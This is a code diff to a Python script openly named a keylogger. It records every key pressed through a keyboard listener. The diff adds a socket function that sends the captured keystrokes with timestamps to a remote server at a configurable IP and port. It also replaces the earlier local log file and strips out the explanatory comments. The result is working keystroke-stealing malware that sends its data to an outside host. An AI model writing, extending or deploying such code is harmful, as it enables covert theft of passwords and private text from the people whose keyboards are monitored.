@@ -4,12 +4,10 @@ from datetime import datetime
 import time
 import pyfiglet
 from colorama import Fore
+import socket
 
 text = pyfiglet.figlet_format("FR_UNI KeyLogger")
 print(Fore.BLUE + text)
-
-                                              
-# This is a simple keylogger that logs the keys pressed by the user and stores them in a file named "keylog.txt" in FR_KeyLogger directory.
 
 keys_pressed = []
 
@@ -23,19 +21,24 @@ def keyPressed(key):
         key_str = str(key).replace("Key.", "")
         keys_pressed.append(f"{{{key_str}}}")
 
+def send_log_to_server(log_data):
+    server_ip = '192.168.56.1'  # Replace with your server's IP address
+    server_port = 9999
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((server_ip, server_port))
+        s.sendall(log_data.encode('utf-8'))
+
 def write_log():
     global keys_pressed
     if keys_pressed:
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        with open("scripts/FR_KeyLogger/keylog.txt", 'a') as logKey:
-            logKey.write(f"{timestamp} - {''.join(keys_pressed)}\n")
+        log_data = f"{timestamp} - {''.join(keys_pressed)}\n"
+        send_log_to_server(log_data)
         keys_pressed = []
 
 def cleanup():
-    with open("scripts/FR_KeyLogger/keylog.txt", 'a') as logKey:
-        logKey.write("\n\n")
+    send_log_to_server("\n\n")
 
-# Store the key pressed in a file named "keylog.txt" in FR_KeyLog directory.
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
